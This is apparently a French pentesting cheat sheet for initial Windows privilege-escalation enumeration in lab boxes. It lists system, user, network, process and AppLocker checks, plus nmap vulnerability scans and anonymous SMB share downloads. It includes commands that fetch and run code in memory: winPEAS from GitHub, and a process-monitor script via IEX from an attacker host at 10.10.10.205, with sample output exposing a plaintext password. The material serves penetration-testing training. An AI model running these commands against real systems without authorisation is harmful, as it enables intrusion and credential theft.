# 01-Énumération Initiale

### Énumération Initiale

Winpeas téléchargement et utilisation :

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe" %}

```sh
# Obtenir la dernière version
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# Ligne de commande unique pour télécharger et exécuter winPEASany depuis la mémoire dans un shell PS
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

#### Informations Système

```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list
[environment]::OSVersion.Version
Get-HotFix | ft -AutoSize
wmic product get name,version
```

#### Énumération Utilisateurs & Groupes

```powershell
whoami
whoami /priv
whoami /groups
net user
net user [username]
net localgroup
net localgroup administrators
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember administrators
```

#### Énumération Réseau

```powershell
ipconfig /all
arp -a
route print
netstat -ano
Get-NetTCPConnection
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

#### Énumération des Processus

```powershell
tasklist /svc
Get-Process
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service list brief
```

#### Surveillance des Lignes de Commande des Processus

Nous pouvons rechercher les lignes de commande des processus en utilisant un script comme celui ci-dessous. Il capture les lignes de commande des processus toutes les deux secondes.

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

Nous pouvons héberger le script sur notre machine d'attaque et l'exécuter sur l'hôte cible comme suit :

```powershell-session
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1')
...
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>
...
```

#### Énumération AppLocker & Antivirus

```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
sc query windefend
netsh advfirewall show currentprofile
```

### Techniques d'élévation de privilèges Windows dans des Box (Exemples d'Énumération)

#### Analyse des services et ports ouverts

Exemple (Legacy) :

```bash
# Utiliser Nmap avec des scripts de vulnérabilité
nmap -p 445 --script vuln <IP>

# Identifier les services vulnérables
nmap -sV -p <PORT> <IP>
```

#### Énumération des partages SMB

Exemple (Nest) :

```bash
# Énumération des partages avec smbmap
smbmap -H <IP> -u null

# Connexion anonyme avec smbclient
smbclient -N //<IP>/<SHARE>

# Téléchargement récursif de fichiers
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
``` 